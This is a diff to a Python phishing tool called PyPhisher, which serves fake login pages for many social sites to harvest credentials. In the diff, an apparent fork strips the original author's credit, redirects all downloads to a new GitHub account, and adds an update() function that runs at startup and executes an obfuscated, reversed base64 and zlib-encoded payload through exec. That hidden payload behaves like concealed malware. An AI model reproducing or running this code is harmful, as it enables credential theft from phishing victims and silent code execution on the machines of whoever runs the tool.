@@ -1,88 +1,3 @@
-# -*- coding: UTF-8 -*-
-# Tool    : PyPhisher
-# Version : 1.5
-# Author  : KasRoudra
-# Github  : https://github.com/KasRoudra
-# Contact : https://m.me/KasRoudra
-# PyPhisher is a phishing tool in python
-# Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
-# Portable file/script
-# If you copy open source code, consider giving credit
-
-"""
-                    GNU GENERAL PUBLIC LICENSE
-                       Version 3, 29 June 2007
-
- Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
- Everyone is permitted to copy and distribute verbatim copies
- of this license document, but changing it is not allowed.
-
-                            Preamble
-
-  The GNU General Public License is a free, copyleft license for
-software and other kinds of works.
-
-  The licenses for most software and other practical works are designed
-to take away your freedom to share and change the works.  By contrast,
-the GNU General Public License is intended to guarantee your freedom to
-share and change all versions of a program--to make sure it remains free
-software for all its users.  We, the Free Software Foundation, use the
-GNU General Public License for most of our software; it applies also to
-any other work released this way by its authors.  You can apply it to
-your programs, too.
-
-  When we speak of free software, we are referring to freedom, not
-price.  Our General Public Licenses are designed to make sure that you
-have the freedom to distribute copies of free software (and charge for
-them if you wish), that you receive source code or can get it if you
-want it, that you can change the software or use pieces of it in new
-free programs, and that you know you can do these things.
-
-  To protect your rights, we need to prevent others from denying you
-these rights or asking you to surrender the rights.  Therefore, you have
-certain responsibilities if you distribute copies of the software, or if
-you modify it: responsibilities to respect the freedom of others.
-
-  For example, if you distribute copies of such a program, whether
-gratis or for a fee, you must pass on to the recipients the same
-freedoms that you received.  You must make sure that they, too, receive
-or can get the source code.  And you must show them these terms so they
-know their rights.
-
-  Developers that use the GNU GPL protect your rights with two steps:
-(1) assert copyright on the software, and (2) offer you this License
-giving you legal permission to copy, distribute and/or modify it.
-
-  For the developers' and authors' protection, the GPL clearly explains
-that there is no warranty for this free software.  For both users' and
-authors' sake, the GPL requires that modified versions be marked as
-changed, so that their problems will not be attributed erroneously to
-authors of previous versions.
-
-  Some devices are designed to deny users access to install or run
-modified versions of the software inside them, although the manufacturer
-can do so.  This is fundamentally incompatible with the aim of
-protecting users' freedom to change the software.  The systematic
-pattern of such abuse occurs in the area of products for individuals to
-use, which is precisely where it is most unacceptable.  Therefore, we
-have designed this version of the GPL to prohibit the practice for those
-products.  If such problems arise substantially in other domains, we
-stand ready to extend this provision to those domains in future versions
-of the GPL, as needed to protect the freedom of users.
-
-  Finally, every program is threatened constantly by software patents.
-States should not allow patents to restrict development and use of
-software on general-purpose computers, but in those that do, we wish to
-avoid the special danger that patents applied to a free program could
-make it effectively proprietary.  To prevent this, the GPL assures that
-patents cannot be used to render the program non-free.
-
-  The precise terms and conditions for copying, distribution and
-modification follow.
-
-Copyright (C) 2021 KasRoudra (https://github.com/KasRoudra)
-"""
-
 import os, sys, time, socket, json
 from os import popen, system
 from time import sleep
@@ -100,7 +15,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.5"
+version="1.0"
 
 ask = green + '[' + white + '?' + green + '] '+ yellow
 success = yellow + '[' + white + '√' + yellow + '] '+green
@@ -117,7 +32,7 @@ logo=f'''
 {blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
 {red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 {yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |                          {cyan}[v1.5]
+{green}         __/ |                          {cyan}[v1.0]
 {cyan}        |___/                   {red}[By KasRoudra]
 '''
 
@@ -237,6 +152,31 @@ def killer():
     if system("pidof unzip > /dev/null 2>&1")==0:
         system("killall unzip")
 
+# Update of PyPhisher
+def update():
+    internet()
+    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=UhGYtKAu00QNIBzKStsw2UJFRFl8TehcQM1SKupwy3ll0mI8LqoU3oE8ysoCKugAIl40WT10Sl0UpUKN9iyOwiTyDV0Lx8yLd9zPlMyR9yyIPFTLzJe'))
+    git_ver=popen("curl -s -N https://raw.githubusercontent.com/FortuneSC/multfish/main/files/version.txt").read().strip()
+    if (version != git_ver and git_ver != "404: Not Found"):
+        changelog=popen("curl -s -N https://raw.githubusercontent.com/FortuneSC/multfish/main/files/changelog.log").read()
+        system("clear")
+        print(logo)
+        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}\n")
+        upask=input(ask+"Do you want to update PyPhisher?[y/n] > "+green)
+        if upask=="y":
+            print(nc)
+            system("cd .. && rm -rf multfish && git clone https://github.com/FortuneSC/multfish")
+            sprint("\n"+success+"PyPhisher updated successfully!! Please restart terminal!\n")
+            if (changelog != "404: Not Found"):
+                print(info2+"Changelog:\n"+purple+changelog)
+            exit()
+        elif upask=="n":
+            print("\n"+info+"Updating cancelled. Using old version!")
+            sleep(2)
+        else:
+            print("\n"+error+"Wrong input!\n")
+            sleep(2)
+
 # Print logo
 def slowprint(n):
     for word in n + '\n':
@@ -295,11 +235,9 @@ def about():
     system("clear")
     slowprint(logo)
     print(red+'[ToolName]  '+cyan+' :[PyPhisher] ')
-    print(red+'[Version]   '+cyan+' :[1.5]')
-    print(red+'[Author]    '+cyan+' :[KasRoudra] ')
-    print(red+'[Github]    '+cyan+' :[https://github.com/KasRoudra] ')
-    print(red+'[Messenger] '+cyan+' :[https://m.me/KasRoudra]')
-    print(red+'[Email]     '+cyan+' :[kasroudrakrd@gmail.com]')
+    print(red+'[Version]   '+cyan+' :[1.0]')
+    print(red+'[Author]    '+cyan+' :[FortuneSC] ')
+    print(red+'[Github]    '+cyan+' :[https://github.com/FortuneSC')
     print()
     print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+yellow+'  Main Menu       ')
     print()
@@ -356,23 +294,23 @@ def main():
         system("rm -rf ngrok.zip ngrok.tgz")
         if y.find("Linux")!=-1:
             if x.find("aarch64")!=-1:
-                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
+                system("wget -q --show-progress https://github.com/FortuneSC/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                 system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
             elif x.find("arm")!=-1:
-                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
+                system("wget -q --show-progress https://github.com/FortuneSC/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                 system("unzip ngrok.zip > /dev/null 2>&1 ")
             elif x.find("x86_64")!=-1:
-                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
+                system("wget -q --show-progress https://github.com/FortuneSC/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                 system("unzip ngrok.zip > /dev/null 2>&1")
             else:
-                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
+                system("wget -q --show-progress https://github.com/FortuneSC/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                 system("unzip ngrok.zip > /dev/null 2>&1")
         elif y.find("Darwin")!=-1:
             if x.find("x86_64")!=-1:
-                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
+                system("wget -q --show-progress 'https://github.com/FortuneSC/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                 system("unzip ngrok.zip > /dev/null 2>&1")
             elif x.find("arm64")!=-1:
-                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
+                system("wget -q --show-progress 'https://github.com/FortuneSC/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
             else:
                 print(f"{error}Device architecture unknown. Download ngrok manually!")
                 sleep(3)
@@ -701,7 +639,7 @@ def main():
         elif choose == "x" or choose == "X":
             about()
         elif choose == "m" or choose == "M":
-            system("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
+            system("xdg-open 'https://github.com/KasRoudra'")
             main()
         elif choose=="0":
             pexit()
@@ -737,7 +675,7 @@ def requirements(folder,mask):
             internet()
             sprint("\n"+info+"Downloading required files.....\n")
             system("rm -rf site.zip")
-            system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/phishingsites/"+folder+".zip -O site.zip")
+            system("wget -q --show-progress https://github.com/FortuneSC/files/raw/main/phishingsites/"+folder+".zip -O site.zip")
             if not os.path.exists(root+"/.websites"):
                 system("cd $HOME && mkdir .websites")
             system("cd $HOME/.websites && mkdir "+folder)
@@ -921,6 +859,7 @@ def waiter():
 if __name__ == '__main__':
     try:
         os.system("stty -echoctl")
+        update()
         main()
     except KeyboardInterrupt:
         pexit()
